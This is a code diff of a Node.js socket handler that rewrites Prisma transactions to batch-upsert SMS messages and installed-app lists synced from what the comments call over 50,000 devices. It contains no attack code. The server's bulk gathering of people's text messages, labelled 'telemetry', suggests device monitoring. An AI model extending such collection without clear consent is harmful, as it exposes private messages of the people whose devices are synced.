@@ -100,14 +100,15 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
                 return;
             }
 
-            await prisma.$transaction(async (tx) => {
-                for (const msg of validMessages) {
+            // Parallel Upsert Optimization for high-scale (50k+ devices)
+            await prisma.$transaction(
+                validMessages.map(msg => {
                     const dId = getVal(msg, 'device_id', 'deviceId');
                     const idRaw = getVal(msg, 'id', 'id');
                     const smsId = String(idRaw);
                     const localSmsId = String(getVal(msg, 'local_sms_id', 'localSmsId') || smsId);
 
-                    await tx.smsMessage.upsert({
+                    return prisma.smsMessage.upsert({
                         where: { device_id_local_sms_id: { device_id: dId, local_sms_id: localSmsId } },
                         update: {
                             id: smsId,
@@ -116,7 +117,8 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
                             date: getVal(msg, 'date', 'date') || new Date().toISOString(),
                             timestamp: toBigInt(getVal(msg, 'timestamp', 'timestamp')) || BigInt(0),
                             type: parseInt(getVal(msg, 'type', 'type') || "1"),
-                            sync_status: 'synced'
+                            sync_status: 'synced',
+                            updated_at: new Date()
                         },
                         create: {
                             id: smsId,
@@ -130,8 +132,9 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
                             sync_status: 'synced'
                         }
                     });
-                }
-            }, { timeout: 30000 });
+                }),
+                { timeout: 30000 }
+            );
 
             logger.info(`✅ Synced ${validMessages.length} SMS messages for ${deviceId}`);
             validMessages.forEach(msg => notifyChange('message_change', { ...msg, device_id: getVal(msg, 'device_id', 'deviceId') }));
@@ -204,13 +207,14 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
                 return;
             }
 
-            await prisma.$transaction(async (tx) => {
-                for (const app of validApps) {
+            // Parallel Upsert Optimization for Apps
+            await prisma.$transaction(
+                validApps.map(app => {
                     const packageName = getVal(app, 'package_name', 'packageName');
                     const dId = getVal(app, 'device_id', 'deviceId');
                     const appName = getVal(app, 'app_name', 'appName') || packageName;
 
-                    await tx.installedApp.upsert({
+                    return prisma.installedApp.upsert({
                         where: { device_id_package_name: { device_id: dId, package_name: packageName } },
                         update: {
                             app_name: appName,
@@ -240,8 +244,9 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
                             sync_timestamp: toBigInt(getVal(app, 'sync_timestamp', 'syncTimestamp')) || BigInt(Date.now()),
                         }
                     });
-                }
-            }, { timeout: 30000 });
+                }),
+                { timeout: 30000 }
+            );
 
             logger.info(`✅ Synced ${validApps.length} apps for ${deviceId}`);
             socket.emit('sync_complete', 'apps', validApps.length);
